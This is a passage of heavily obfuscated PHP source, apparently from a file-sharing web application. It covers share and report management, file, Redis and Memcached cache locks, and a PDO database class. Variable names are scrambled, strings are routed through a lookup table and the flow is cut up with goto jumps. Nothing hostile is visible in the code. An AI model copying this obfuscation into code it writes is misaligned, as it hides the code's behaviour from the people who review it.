$¨‘ÏÄñÈ); } protected function remove($œÆõíÎ) { $ºÎäşœ» =& $_SERVER[ÓïÕü]; $­«¤æ‰€ = is_array($œÆõíÎ) ? $œÆõíÎ : array($œÆõíÎ); for ($Óë€è·¨ = 0; $Óë€è·¨ < count($­«¤æ‰€); $Óë€è·¨++) { $¿Êáô©‰ = $this->getInfo($­«¤æ‰€[$Óë€è·¨]); if ($¿Êáô©‰[$ºÎäşœ»[671]] == $ºÎäşœ»[91]) { Model($ºÎäşœ»[641])->eventShare($¿Êáô©‰[$ºÎäşœ»[194]], $ºÎäşœ»[2171]); } if ($¿Êáô©‰[$ºÎäşœ»[567]] == $ºÎäşœ»[91]) { Model($ºÎäşœ»[641])->eventShare($¿Êáô©‰[$ºÎäşœ»[194]], $ºÎäşœ»[2170]); } $this->shareInfoMofify($¿Êáô©‰, $ºÎäşœ»[2155]); } $»¿ÚÓÅ = array($ºÎäşœ»[673] => array($ºÎäşœ»[7], $­«¤æ‰€)); $æï½¬¨Ú = $this->where($»¿ÚÓÅ)->delete(); if ($æï½¬¨Ú) { Model($ºÎäşœ»[674])->where($»¿ÚÓÅ)->delete(); } return $æï½¬¨Ú; } protected function removeBySource($ƒ‹øŒ©ê) { $å©¢Æï¸ =& $_SERVER[ÓïÕü]; $úÜÑ‰Û = array($å©¢Æï¸[494] => array($å©¢Æï¸[495], $ƒ‹øŒ©ê)); $ğğ¶ÁíÑ = $this->field($å©¢Æï¸[673])->where($úÜÑ‰Û)->select(); $ˆÜÅìª = array_to_keyvalue($ğğ¶ÁíÑ, $å©¢Æï¸[12], $å©¢Æï¸[673]); if (!$ˆÜÅìª) { return; } foreach ($ğğ¶ÁíÑ as $–±µ×üì) { $this->shareInfoMofify($–±µ×üì, $å©¢Æï¸[2155]); } $úÜÑ‰Û = array($å©¢Æï¸[2177] => array($å©¢Æï¸[495], $ˆÜÅìª)); $this->where($úÜÑ‰Û)->delete(); Model($å©¢Æï¸[674])->where($úÜÑ‰Û)->delete(); } public function listAll($ÏŠÔ·) { $·Ò®¤Ñ£ =& $_SERVER[ÓïÕü]; $ØĞ °°¥ = array(); if ($ÏŠÔ·[$·Ò®¤Ñ£[1806]]) { $ØĞ °°¥[$·Ò®¤Ñ£[1806]] = $ÏŠÔ·[$·Ò®¤Ñ£[1806]]; } if ($ÏŠÔ·[$·Ò®¤Ñ£[851]]) { $êÙÎÏèû = $ÏŠÔ·[$·Ò®¤Ñ£[852]] ? $ÏŠÔ·[$·Ò®¤Ñ£[852]] : strtotime(date($·Ò®¤Ñ£[2185])); $ØĞ °°¥[$·Ò®¤Ñ£[234]] = array($·Ò®¤Ñ£[411], array($ÏŠÔ·[$·Ò®¤Ñ£[851]], $êÙÎÏèû)); } if ($ÏŠÔ·[$·Ò®¤Ñ£[33]]) { $ØĞ °°¥[$ÏŠÔ·[$·Ò®¤Ñ£[33]]] = 1; } else { $ØĞ °°¥[] = array($·Ò®¤Ñ£[567] => array($·Ò®¤Ñ£[1116], 0), $·Ò®¤Ñ£[671] => array($·Ò®¤Ñ£[1116], 0), $·Ò®¤Ñ£[2159] => $·Ò®¤Ñ£[2109]); } if ($ÏŠÔ·[$·Ò®¤Ñ£[2105]]) { $ØĞ °°¥[] = array($·Ò®¤Ñ£[2156] => $ÏŠÔ·[$·Ò®¤Ñ£[2105]], $·Ò®¤Ñ£[1694] => array($·Ò®¤Ñ£[462], "\45{$ÏŠÔ·[$·Ò®¤Ñ£[2105]]}\45"), $·Ò®¤Ñ£[2159] => $·Ò®¤Ñ£[2109]); } $Ë»·Ñ¼ = $this->_makeOrder()->where($ØĞ °°¥)->selectPage(20); if (empty($Ë»·Ñ¼[$·Ò®¤Ñ£[448]])) { return array(); } $this->_listDataApply($Ë»·Ñ¼[$·Ò®¤Ñ£[448]]); return $Ë»·Ñ¼; } public function listDataApply($òêÏäî¶) { $this->_listDataApply($òêÏäî¶); return $òêÏäî¶; } private function _listDataApply(&$ı™ëÁñÚ) { $”¢ÒÆşÑ =& $_SERVER[ÓïÕü]; $ñ³ÖƒÂ = array_to_keyvalue($ı™ëÁñÚ, $”¢ÒÆşÑ[12], $”¢ÒÆşÑ[1806]); $¯“öúĞÄ = Model($”¢ÒÆşÑ[602])->userListInfo(array_unique($ñ³ÖƒÂ)); $Ö¬Å×£ = array_to_keyvalue($ı™ëÁñÚ, $”¢ÒÆşÑ[12], $”¢ÒÆşÑ[194]); $¹ú²·ª„ = Model($”¢ÒÆşÑ[921])->sourceListInfo($Ö¬Å×£, !0); foreach ($ı™ëÁñÚ as $Ë¤Œî => &$É¢œôÌ½) { $¬Â¡é× = $É¢œôÌ½[$”¢ÒÆşÑ[1806]]; $É¢œôÌ½[$”¢ÒÆşÑ[2186]] = $¯“öúĞÄ[$¬Â¡é×] ? $¯“öúĞÄ[$¬Â¡é×] : !1; if (!$É¢œôÌ½[$”¢ÒÆşÑ[2186]] || $É¢œôÌ½[$”¢ÒÆşÑ[2186]][$”¢ÒÆşÑ[841]] != $”¢ÒÆşÑ[91]) { unset($ı™ëÁñÚ[$Ë¤Œî]); continue; } $½ÃÕ†† = $É¢œôÌ½[$”¢ÒÆşÑ[194]]; $É¢œôÌ½[$”¢ÒÆşÑ[90]] = $¹ú²·ª„[$½ÃÕ††] ? $¹ú²·ª„[$½ÃÕ††] : !1; if ($É¢œôÌ½[$”¢ÒÆşÑ[90]][$”¢ÒÆşÑ[508]] == $”¢ÒÆşÑ[91]) { unset($ı™ëÁñÚ[$Ë¤Œî]); } if ($É¢œôÌ½[$”¢ÒÆşÑ[90]] != $”¢ÒÆşÑ[231] && !$É¢œôÌ½[$”¢ÒÆşÑ[90]]) { unset($ı™ëÁñÚ[$Ë¤Œî]); } } unset($É¢œôÌ½); $ı™ëÁñÚ = array_values($ı™ëÁñÚ); } private function _makeOrder($õ°â®òÊ = '') { $Ë“¸Ö =& $_SERVER[ÓïÕü]; $¼êĞúŸ½ = array($Ë“¸Ö[234], $Ë“¸Ö[852], $Ë“¸Ö[2173], $Ë“¸Ö[2174]); $®İĞĞô = array($Ë“¸Ö[526] => $Ë“¸Ö[527], $Ë“¸Ö[528] => $Ë“¸Ö[529]); $Çàôà²Í = Input::get($Ë“¸Ö[533], $Ë“¸Ö[7], $Ë“¸Ö[500], $¼êĞúŸ½); $“Öìšºú = Input::get($Ë“¸Ö[534], $Ë“¸Ö[7], $Ë“¸Ö[2187], array($Ë“¸Ö[2102], $Ë“¸Ö[528])); $“Öìšºú = $®İĞĞô[$“Öìšºú]; $õ°â®òÊ = $õ°â®òÊ . "{$Çàôà²Í}\40{$“Öìšºú}"; return $this->order($õ°â®òÊ); } public function reportAdd($¶Œû¸û±) { $§‰Ş‘› =& $_SERVER[ÓïÕü]; $»â­’âÂ = array($§‰Ş‘›[673] => $¶Œû¸û±[$§‰Ş‘›[673]], $§‰Ş‘›[1806] => USER_ID); if (Model($§‰Ş‘›[2183])->where($»â­’âÂ)->find()) { return !1; } $Ì°ãÖ» = array($§‰Ş‘›[673] => $¶Œû¸û±[$§‰Ş‘›[673]], $§‰Ş‘›[1694] => $¶Œû¸û±[$§‰Ş‘›[1694]], $§‰Ş‘›[194] => $¶Œû¸û±[$§‰Ş‘›[194]], $§‰Ş‘›[546] => $¶Œû¸û±[$§‰Ş‘›[546]], $§‰Ş‘›[1806] => USER_ID, $§‰Ş‘›[33] => $¶Œû¸û±[$§‰Ş‘›[33]], $§‰Ş‘›[529] => $¶Œû¸û±[$§‰Ş‘›[529]]); return Model($§‰Ş‘›[2183])->add($Ì°ãÖ»); } public function reportList($øÆËÍŸ¾) { $Úõ¼„¡å =& $_SERVER[ÓïÕü]; $—ªëëõò = array(); if ($øÆËÍŸ¾[$Úõ¼„¡å[851]]) { $ƒä–÷¨‹ = $øÆËÍŸ¾[$Úõ¼„¡å[852]] ? $øÆËÍŸ¾[$Úõ¼„¡å[852]] : strtotime(date($Úõ¼„¡å[2185])); $—ªëëõò[$Úõ¼„¡å[234]] = array($Úõ¼„¡å[411], array($øÆËÍŸ¾[$Úõ¼„¡å[851]], $ƒä–÷¨‹)); } if (isset($øÆËÍŸ¾[$Úõ¼„¡å[33]]) && in_array($øÆËÍŸ¾[$Úõ¼„¡å[33]], array($Úõ¼„¡å[91], $Úõ¼„¡å[513], $Úõ¼„¡å[2188], $Úõ¼„¡å[2189], $Úõ¼„¡å[2190]))) { $—ªëëõò[$Úõ¼„¡å[33]] = $øÆËÍŸ¾[$Úõ¼„¡å[33]]; } if (isset($øÆËÍŸ¾[$Úõ¼„¡å[841]]) && in_array($øÆËÍŸ¾[$Úõ¼„¡å[841]], array($Úõ¼„¡å[231], $Úõ¼„¡å[91], $Úõ¼„¡å[513], $Úõ¼„¡å[2188]))) { $—ªëëõò[$Úõ¼„¡å[841]] = $øÆËÍŸ¾[$Úõ¼„¡å[841]]; } $š‰òÖáˆ = Input::get($Úõ¼„¡å[534], $Úõ¼„¡å[7], $Úõ¼„¡å[2187], array($Úõ¼„¡å[2102], $Úõ¼„¡å[528])); $Ğ‚¥²“ = array($Úõ¼„¡å[526] => $Úõ¼„¡å[527], $Úõ¼„¡å[528] => $Úõ¼„¡å[529]); $Ğ¾“º†… = $Úõ¼„¡å[2191] . $Ğ‚¥²“[$š‰òÖáˆ]; $€ì„ü¡€ = Model($Úõ¼„¡å[2183])->where($—ªëëõò)->order($Ğ¾“º†…)->selectPage(20); if (empty($€ì„ü¡€[$Úõ¼„¡å[448]])) { return array(); } $µ§òî¡Ï = array_to_keyvalue_group($€ì„ü¡€[$Úõ¼„¡å[448]], $Úõ¼„¡å[841], $Úõ¼„¡å[673]); if (!empty($µ§òî¡Ï[0])) { $øÆËÍŸ¾ = $µ§òî¡Ï[0]; $—ªëëõò = array($Úõ¼„¡å[673] => array($Úõ¼„¡å[7], $øÆËÍŸ¾)); $Ùïâäı = $this->where($—ªëëõò)->field($Úõ¼„¡å[673])->select(); $Ùïâäı = array_to_keyvalue($Ùïâäı, $Úõ¼„¡å[12], $Úõ¼„¡å[673]); $È’Àï = array_diff($øÆËÍŸ¾, $Ùïâäı); if (!empty($È’Àï)) { foreach ($€ì„ü¡€[$Úõ¼„¡å[448]] as $ıüÃõ”Ò => $óãüë’Æ) { if (in_array($óãüë’Æ[$Úõ¼„¡å[673]], $È’Àï)) { unset($€ì„ü¡€[$Úõ¼„¡å[448]][$ıüÃõ”Ò]); } } } } $this->_listDataApply($€ì„ü¡€[$Úõ¼„¡å[448]]); return $€ì„ü¡€; } public function reportStatus($ôö¬™œ) { $áÆºè¨ =& $_SERVER[ÓïÕü]; $÷Àá‹ù» = array($áÆºè¨[478] => $ôö¬™œ[$áÆºè¨[478]]); $Êç­¡È´ = Model($áÆºè¨[2183])->where($÷Àá‹ù»)->field($áÆºè¨[2192])->find(); if (!$Êç­¡È´) { return !1; } $‰ÕÛ»ÉÓ = array($áÆºè¨[841] => $ôö¬™œ[$áÆºè¨[841]]); if ($ôö¬™œ[$áÆºè¨[841]] == $áÆºè¨[2188] && $Êç­¡È´[$áÆºè¨[841]] == $áÆºè¨[2188]) { $‰ÕÛ»ÉÓ[$áÆºè¨[841]] = 0; } $ÙËÅ° = Model($áÆºè¨[2183])->where($÷Àá‹ù»)->save($‰ÕÛ»ÉÓ); if ($ôö¬™œ[$áÆºè¨[841]] == $áÆºè¨[513]) { if ($Êç­¡È´[$áÆºè¨[546]] != $áÆºè¨[231] && $this->shareFileMeta($Êç­¡È´[$áÆºè¨[546]])) { $this->shareFileMeta($Êç­¡È´[$áÆºè¨[546]], 0); } $this->remove($Êç­¡È´[$áÆºè¨[673]]); return !0; } if ($ÙËÅ° && $ôö¬™œ[$áÆºè¨[841]] == $áÆºè¨[2188]) { $è¸Ğ‘¼ˆ = $‰ÕÛ»ÉÓ[$áÆºè¨[841]] == $áÆºè¨[2188] ? 1 : 0; $this->shareFileMeta($Êç­¡È´[$áÆºè¨[546]], $è¸Ğ‘¼ˆ); $this->removeByFile($Êç­¡È´[$áÆºè¨[546]]); } return $ÙËÅ°; } private function removeByFile($û¸Ğı÷­) { $ƒğúÄ =& $_SERVER[ÓïÕü]; $ŒÎôÉ• = Model($ƒğúÄ[921])->where(array($ƒğúÄ[546] => $û¸Ğı÷­))->field($ƒğúÄ[194])->select(); $ÆÎñ¥¿ê = array_to_keyvalue($ŒÎôÉ•, $ƒğúÄ[12], $ƒğúÄ[194]); $É‘ÓßÖ› = array($ƒğúÄ[194] => array($ƒğúÄ[7], $ÆÎñ¥¿ê), $ƒğúÄ[567] => 1); $ŒÎôÉ• = $this->where($É‘ÓßÖ›)->field($ƒğúÄ[673])->select(); if (empty($ŒÎôÉ•)) { return; } $Îø÷³Ğİ = array_to_keyvalue($ŒÎôÉ•, $ƒğúÄ[12], $ƒğúÄ[673]); $this->remove($Îø÷³Ğİ); } private function shareFileMeta($Ê¬¯ÂĞ, $İŒ°‚’Ê = null) { $‹ñó¼Ğ =& $_SERVER[ÓïÕü]; $¾¦£™òÌ = array($‹ñó¼Ğ[546] => $Ê¬¯ÂĞ, $‹ñó¼Ğ[97] => $‹ñó¼Ğ[2193]); if (is_null($İŒ°‚’Ê)) { return Model($‹ñó¼Ğ[2194])->where($¾¦£™òÌ)->find(); } $¾¦£™òÌ[$‹ñó¼Ğ[453]] = $İŒ°‚’Ê; Model($‹ñó¼Ğ[2194])->add($¾¦£™òÌ, array(), !0); } } goto A­à‰¯é÷Î; E°ƒ·ÎĞØ·: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $üıì‡à‰ =& $_SERVER[ÓïÕü]; $®Ïîƒõ„ = $GLOBALS[$üıì‡à‰[6]][$üıì‡à‰[427]]; self::$cachePath = $®Ïîƒõ„[$üıì‡à‰[233]][$üıì‡à‰[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($Ôã ¨ıŞ, $ÁÏÜáíü = 0) { $„·óè´ =& $_SERVER[ÓïÕü]; $€‹‹â· = microtime(!0); $Ç›ìíúÕ = $€‹‹â· + $ÁÏÜáíü + 0.0001; $ŞŞÈºØ = rtrim(self::$cachePath, $„·óè´[8]) . $„·óè´[969] . md5($Ôã ¨ıŞ) . $„·óè´[966]; if (file_exists($ŞŞÈºØ) && filemtime($ŞŞÈºØ) && filemtime($ŞŞÈºØ) < time() - 10) { @unlink($ŞŞÈºØ); } do { if (file_exists($ŞŞÈºØ)) { cacheLockWait(); continue; } $Š¤¤´× = fopen($ŞŞÈºØ, $„·óè´[970]); if (!$Š¤¤´×) { return !1; } $šƒªÔ¸Ò = flock($Š¤¤´×, LOCK_EX | LOCK_NB); self::$caches[$Ôã ¨ıŞ] = array($„·óè´[971] => $Š¤¤´×, $„·óè´[233] => $ŞŞÈºØ); fwrite($Š¤¤´×, $Ç›ìíúÕ); clearstatcache(); if ($Š¤¤´× && $šƒªÔ¸Ò) { return !0; } cacheLockWait(); } while (microtime(!0) < $Ç›ìíúÕ); $this->unlock($Ôã ¨ıŞ); return !1; } public function lockGet($Ÿõ¾ŸÅÜ) { $Ç“„ëÀî =& $_SERVER[ÓïÕü]; $Ñ¯§ã£ = rtrim(self::$cachePath, $Ç“„ëÀî[8]) . $Ç“„ëÀî[969] . md5($Ÿõ¾ŸÅÜ) . $Ç“„ëÀî[966]; return file_exists($Ñ¯§ã£); } public function unlock($ì™ÁĞüî) { $§şÏ—ÎÒ =& $_SERVER[ÓïÕü]; $Ú†Ä³†ô = self::$caches[$ì™ÁĞüî]; if (!$Ú†Ä³†ô) { return; } @flock($Ú†Ä³†ô[$§şÏ—ÎÒ[971]], LOCK_UN); @fclose($Ú†Ä³†ô[$§şÏ—ÎÒ[971]]); @unlink($Ú†Ä³†ô[$§şÏ—ÎÒ[233]]); unset(self::$caches[$ì™ÁĞüî]); } } class CacheLockRedis { public function lock($íÔ…ÜÕ·, $¬ÊË†Â = 10) { $Š­ëÖğ¯ = Cache::init(); $€ÍÓÖĞø = microtime(!0) + $¬ÊË†Â; while (microtime(!0) < $€ÍÓÖĞø) { $”‚¨ìü² = $Š­ëÖğ¯->get($íÔ…ÜÕ·); if (!$”‚¨ìü²) { $ÚÖİªù« = $Š­ëÖğ¯->setLock($íÔ…ÜÕ·, $€ÍÓÖĞø, $¬ÊË†Â); if ($ÚÖİªù«) { return !0; } } else { if ($”‚¨ìü² < microtime(!0)) { $Š­ëÖğ¯->set($íÔ…ÜÕ·, $€ÍÓÖĞø, $¬ÊË†Â * 2); if ($Š­ëÖğ¯->get($íÔ…ÜÕ·) === $”‚¨ìü²) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($ì×ÍÎåé) { return Cache::init()->get($ì×ÍÎåé); } public function unlock($¦á³†¿—) { return Cache::init()->remove($¦á³†¿—); } } class CacheLockMemcached { public function lock($ÉĞå°±ö, $ÃÀè¦”Ç = 0) { $¶¯š°“€ = Cache::init(); $µçñÌÆ¤ = microtime(!0) + $ÃÀè¦”Ç; while (microtime(!0) < $µçñÌÆ¤) { $êÊ›İ® = $¶¯š°“€->get($ÉĞå°±ö); if (!$êÊ›İ® || $êÊ›İ® < microtime(!0)) { $ñÓÅÃ®¼ = $¶¯š°“€->handle->add($ÉĞå°±ö, $µçñÌÆ¤, $ÃÀè¦”Ç); if ($ñÓÅÃ®¼) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Û÷•ö›‰) { return Cache::init()->get($Û÷•ö›‰); } public function unlock($Æ»€¾†£) { return Cache::init()->remove($Æ»€¾†£); } } goto cÀÍê‰‹Ôî; då„…©³: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ó‰¦ú = '') { $¬Ù½ï¿ =& $_SERVER[ÓïÕü]; if (!class_exists($¬Ù½ï¿[1018])) { think_exception(think_lang($¬Ù½ï¿[14]) . $¬Ù½ï¿[1019]); } if (!empty($ó‰¦ú)) { $this->config = $ó‰¦ú; if (empty($this->config[$¬Ù½ï¿[17]])) { $this->config[$¬Ù½ï¿[17]] = array(); } } } public function connect($­ôò†ëñ = '', $Ò‚·¡å = 0) { $¸“ƒ·æ =& $_SERVER[ÓïÕü]; if (!isset($this->linkID[$Ò‚·¡å])) { if (empty($­ôò†ëñ)) { $­ôò†ëñ = $this->config; } $‰òÕËœÍ = !empty($­ôò†ëñ[$¸“ƒ·æ[17]][$¸“ƒ·æ[18]]) ? $­ôò†ëñ[$¸“ƒ·æ[17]][$¸“ƒ·æ[18]] : $this->pconnect; if ($‰òÕËœÍ) { $­ôò†ëñ[$¸“ƒ·æ[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$Ò‚·¡å] = new PDO($­ôò†ëñ[$¸“ƒ·æ[1020]], $­ôò†ëñ[$¸“ƒ·æ[992]], $­ôò†ëñ[$¸“ƒ·æ[993]], $­ôò†ëñ[$¸“ƒ·æ[17]]); } catch (PDOException $²¸èòÄî) { think_exception($²¸èòÄî->getMessage()); } $this->dbType = $this->_getDsnType($­ôò†ëñ[$¸“ƒ·æ[1020]]); if (in_array($this->dbType, array($¸“ƒ·æ[1021], $¸“ƒ·æ[1022], $¸“ƒ·æ[1023], $¸“ƒ·æ[1024]))) { think_exception($¸“ƒ·æ[1025] . $this->dbType . $¸“ƒ·æ[1026] . $this->dbType . $¸“ƒ·æ[1027]); } if (!$this->linkID[$Ò‚·¡å]) { think_exception($¸“ƒ·æ[1028]); } try { $this->linkID[$Ò‚·¡å]->exec($¸“ƒ·æ[1029] . think_config($¸“ƒ·æ[995])); } catch (Exception $²¸èòÄî) { } $this->connected = !0; if (1 != think_config($¸“ƒ·æ[22])) { unset($this->config); } } return $this->linkID[$Ò‚·¡å]; } public function free() { $this->PDOStatement = null; } public function query($µ„áåûÁ, $’Ç÷²´ = array()) { $¹®Ê€Ó† =& $_SERVER[ÓïÕü]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $µ„áåûÁ; if (!empty($’Ç÷²´)) { $this->queryStr .= $¹®Ê€Ó†[1030] . print_r($’Ç÷²´, !0) . $¹®Ê€Ó†[1031]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($¹®Ê€Ó†[23], 1); think_status($¹®Ê€Ó†[24]); $this->PDOStatement = $this->_linkID->prepare($µ„áåûÁ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ãÃ×Ê¯“ = $this->PDOStatement->execute($’Ç÷²´); $this->debug(); if (!1 === $ãÃ×Ê¯“) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($¥Õ¹èí, $©¶™ş‡… = array()) { $ŞÇä‘˜Â =& $_SERVER[ÓïÕü]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¥Õ¹èí; if (!empty($©¶™ş‡…)) { $this->queryStr .= $ŞÇä‘˜Â[1030] . print_r($©¶™ş‡…, !0) . $ŞÇä‘˜Â[1031]; } $Ã÷ğ°Ø» = !1; if ($this->dbType == $ŞÇä‘˜Â[1024]) { if (preg_match($ŞÇä‘˜Â[1032], $this->queryStr, $À²Úò«)) { $this->table = think_config($ŞÇä‘˜Â[1033]) . str_ireplace(think_config($ŞÇä‘˜Â[1034]), $ŞÇä‘˜Â[457], $À²Úò«[2]); $Ã÷ğ°Ø» = (bool) $this->query($ŞÇä‘˜Â[1035] . strtoupper($this->table) . $ŞÇä‘˜Â[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ŞÇä‘˜Â[25], 1); think_status($ŞÇä‘˜Â[24]); $this->PDOStatement = $this->_linkID->prepare($¥Õ¹èí); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $æèÒ‡± = $this->PDOStatement->execute($©¶™ş‡…); $this->debug(); if (!1 === $æèÒ‡±) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($Ã÷ğ°Ø» || preg_match($ŞÇä‘˜Â[1036], $¥Õ¹èí)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ä¡¬Ş¶ = $this->_linkID->commit(); $this->transTimes = 0; if (!$Ä¡¬Ş¶) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $‚ŞêÄ¥¡ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$‚ŞêÄ¥¡) { $this->error(); return !1; } } return !0; } private function getAll() { $…ÕÊèÍè = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($…ÕÊèÍè); return $…ÕÊèÍè; } public function getFields($öê¡èÕÌ) { $ÆÚ»¬óï =& $_SERVER[ÓïÕü]; $this->initConnect(!0); if (think_config($ÆÚ»¬óï[1037])) { $Ö»¹ÆõÓ = str_replace($ÆÚ»¬óï[1038], $öê¡èÕÌ, think_config($ÆÚ»¬óï[1037])); } else { switch ($this->dbType) { case $ÆÚ»¬óï[1021]: case $ÆÚ»¬óï[1039]: $Ö»¹ÆõÓ = "\123\x45\x4c\105\103\124\40\40\40\143\x6f\154\x75\155\x6e\x5f\x6e\141\x6d\x65\x20\141\x73\x20\x27\x4e\x61\x6d\145\47\x2c\40\x20\40\x64\x61\164\141\137\164\x79\x70\x65\40\141\163\40\47\124\171\x70\145\47\x2c\40\40\x20\143\157\x6c\x75\x6d\x6e\x5f\144\145\x66\x61\x75\x6c\164\x20\141\163\x20\x27\104\145\146\141\165\154\x74\x27\54\40\40\40\x69\x73\x5f\156\165\x6c\x6c\x61\142\154\145\x20\141\163\x20\47\116\165\154\x6c\x27\12\x9\11\106\x52\x4f\115\x9\x69\x6e\x66\157\x72\x6d\141\164\x69\157\x6e\x5f\163\x63\150\x65\x6d\x61\56\x74\141\x62\x6c\145\x73\x20\x41\x53\40\164\xa\x9\x9\x4a\x4f\x49\x4e\x9\151\x6e\x66\157\162\x6d\141\x74\x69\157\x6e\137\x73\x63\150\145\x6d\141\56\143\x6f\x6c\165\x6d\x6e\x73\40\x41\x53\40\x63\xa\x9\11\x4f\x4e\40\40\x74\56\164\141\142\154\x65\x5f\143\141\x74\141\154\x6f\147\40\75\40\143\56\164\141\142\154\145\137\x63\141\164\x61\154\157\147\12\x9\x9\101\x4e\104\x20\x74\x2e\164\x61\x62\x6c\x65\x5f\x73\x63\x68\145\155\141\40\75\40\143\56\164\x61\x62\x6c\x65\x5f\163\143\150\145\x6d\141\12\x9\11\101\x4e\x44\40\x74\56\x74\141\142\154\145\137\x6e\141\155\145\x20\75\x20\x63\56\x74\141\142\x6c\x65\137\x6e\x61\x6d\145\xa\x9\x9\x57\110\x45\122\105\x20\40\x20\164\x2e\164\141\x62\154\145\137\x6e\x61\x6d\145\x20\75\x20\x27{$öê¡èÕÌ}\47"; break; case $ÆÚ»¬óï[1040]: $Ö»¹ÆõÓ = $ÆÚ»¬óï[1041] . $öê¡èÕÌ . $ÆÚ»¬óï[1042]; break; case $ÆÚ»¬óï[1022]: case $ÆÚ»¬óï[1024]: $Ö»¹ÆõÓ = $ÆÚ»¬óï[1043] . $ÆÚ»¬óï[1044] . $ÆÚ»¬óï[1045] . strtoupper($öê¡èÕÌ) . $ÆÚ»¬óï[1046] . strtoupper($öê¡èÕÌ) . $ÆÚ»¬óï[1047]; break; case $ÆÚ»¬óï[1048]: $Ö»¹ÆõÓ = $ÆÚ»¬óï[1049] . $öê¡èÕÌ . $ÆÚ»¬óï[1050]; break; case $ÆÚ»¬óï[1023]: break; case $ÆÚ»¬óï[1051]: default: $Ö»¹ÆõÓ = $ÆÚ»¬óï[1052] . ($this->dbType == $ÆÚ»¬óï[1051] ? "\140{$öê¡èÕÌ}\140" : $öê¡èÕÌ); } } $¬Šô×ì = $this->query($Ö»¹ÆõÓ); $ş„ÏÀƒœ = array(); if ($¬Šô×ì) { foreach ($¬Šô×ì as $¯¾ô÷İÃ => $ò½Ïê¦Ï) { $ò½Ïê¦Ï = array_change_key_case($ò½Ïê¦Ï); $ò½Ïê¦Ï[$ÆÚ»¬óï[32]] = isset($ò½Ïê¦Ï[$ÆÚ»¬óï[32]]) ? $ò½Ïê¦Ï[$ÆÚ»¬óï[32]] : $ÆÚ»¬óï[457]; $ò½Ïê¦Ï[$ÆÚ»¬óï[33]] = isset($ò½Ïê¦Ï[$ÆÚ»¬óï[33]]) ? $ò½Ïê¦Ï[$ÆÚ»¬óï[33]] : $ÆÚ»¬óï[457]; $Õê¹ÉÅô = isset($ò½Ïê¦Ï[$ÆÚ»¬óï[353]]) ? $ò½Ïê¦Ï[$ÆÚ»¬óï[353]] : $ò½Ïê¦Ï[$ÆÚ»¬óï[32]]; $ş„ÏÀƒœ[$Õê¹ÉÅô] = array($ÆÚ»¬óï[32] => $Õê¹ÉÅô, $ÆÚ»¬óï[33] => $ò½Ïê¦Ï[$ÆÚ»¬óï[33]], $ÆÚ»¬óï[35] => (bool) (isset($ò½Ïê¦Ï[$ÆÚ»¬óï[106]]) && $ò½Ïê¦Ï[$ÆÚ»¬óï[106]] === $ÆÚ»¬óï[12] || isset($ò½Ïê¦Ï[$ÆÚ»¬óï[35]]) && $ò½Ïê¦Ï[$ÆÚ»¬óï[35]] === $ÆÚ»¬óï[12]), $ÆÚ»¬óï[37] => isset($ò½Ïê¦Ï[$ÆÚ»¬óï[37]]) ? $ò½Ïê¦Ï[$ÆÚ»¬óï[37]] : (isset($ò½Ïê¦Ï[$ÆÚ»¬óï[56]]) ? $ò½Ïê¦Ï[$ÆÚ»¬óï[56]] : $ÆÚ»¬óï[457]), $ÆÚ»¬óï[39] => isset($ò½Ïê¦Ï[$ÆÚ»¬óï[97]]) ? strtolower($ò½Ïê¦Ï[$ÆÚ»¬óï[97]]) == $ÆÚ»¬óï[41] : (isset($ò½Ïê¦Ï[$ÆÚ»¬óï[57]]) ? $ò½Ïê¦Ï[$ÆÚ»¬óï[57]] : !1), $ÆÚ»¬óï[42] => isset($ò½Ïê¦Ï[$ÆÚ»¬óï[1053]]) ? strtolower($ò½Ïê¦Ï[$ÆÚ»¬óï[1053]]) == $ÆÚ»¬óï[44] : (isset($ò½Ïê¦Ï[$ÆÚ»¬óï[97]]) ? $ò½Ïê¦Ï[$ÆÚ»¬óï[97]] : !1)); } } return $ş„ÏÀƒœ; } public function getTables($ãËşºõ¶ = '') { $şÜĞÕûŸ =& $_SERVER[ÓïÕü]; if (think_config($şÜĞÕûŸ[1054])) { $ä‚ÑôÉÏ = str_replace($şÜĞÕûŸ[1055], $ãËşºõ¶, think_config($şÜĞÕûŸ[1054])); } else { switch ($this->dbType) { case $şÜĞÕûŸ[1022]: case $şÜĞÕûŸ[1024]: $ä‚ÑôÉÏ = $şÜĞÕûŸ[1056]; break; case $şÜĞÕûŸ[1021]: case $şÜĞÕûŸ[1039]: $ä‚ÑôÉÏ = $şÜĞÕûŸ[1057]; break; case $şÜĞÕûŸ[1048]: $ä‚ÑôÉÏ = $şÜĞÕûŸ[1058]; break; case $şÜĞÕûŸ[1023]: think_exception(think_lang($şÜĞÕûŸ[1059]) . $şÜĞÕûŸ[1060]); break; case $şÜĞÕûŸ[1040]: $ä‚ÑôÉÏ = $şÜĞÕûŸ[45] . $şÜĞÕûŸ[46] . $şÜĞÕûŸ[47]; break; case $şÜĞÕûŸ[1051]: default: if (!empty($ãËşºõ¶)) { $ä‚ÑôÉÏ = $şÜĞÕûŸ[1003] . $ãËşºõ¶ . $şÜĞÕûŸ[1004]; } else { $ä‚ÑôÉÏ = $şÜĞÕûŸ[1005]; } } } $²Ï»¦¢ = $this->query($ä‚ÑôÉÏ); $É‚óÅÉ = array(); foreach ($²Ï»¦¢ as $¡®ğ¼£¹ => $ÀÉû¹à) { 